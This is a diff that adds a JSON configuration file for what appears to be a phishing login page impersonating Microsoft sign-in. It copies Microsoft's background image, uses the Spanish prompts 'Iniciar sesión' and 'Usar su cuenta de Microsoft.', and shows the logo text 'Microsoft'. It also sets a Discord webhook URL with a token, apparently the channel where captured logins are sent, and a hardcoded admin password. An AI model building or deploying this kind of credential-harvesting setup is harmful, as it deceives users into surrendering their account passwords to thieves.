@@ -1,0 +1,19 @@
+{
+  "discordWebhook": "https://discord.com/api/webhooks/1552922193904533585/qFZTJm-dvi8rtMebse3E46vYEJHiRUMPCOT431ObwBflrQM0B0pYoaiEWZVolklwl0mk",
+  "loginBgType": "image",
+  "loginBgColor": "#0a0a1a",
+  "loginBgGradient": "linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)",
+  "loginBgImage": "https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg",
+  "loginTitle": "Iniciar sesión",
+  "loginSubtitle": "Usar su cuenta de Microsoft.",
+  "loginButton": "Siguiente",
+  "loginBgOverlay": true,
+  "loginCardBg": "rgba(255, 255, 255, 0.15)",
+  "loginCardBlur": "10px",
+  "adminPassword": "admin123",
+  "adminAccessEnabled": true,
+  "discordMessageTemplate": "",
+  "showLogo": true,
+  "logoText": "Microsoft",
+  "favicon": "/favicon.svg"
+}
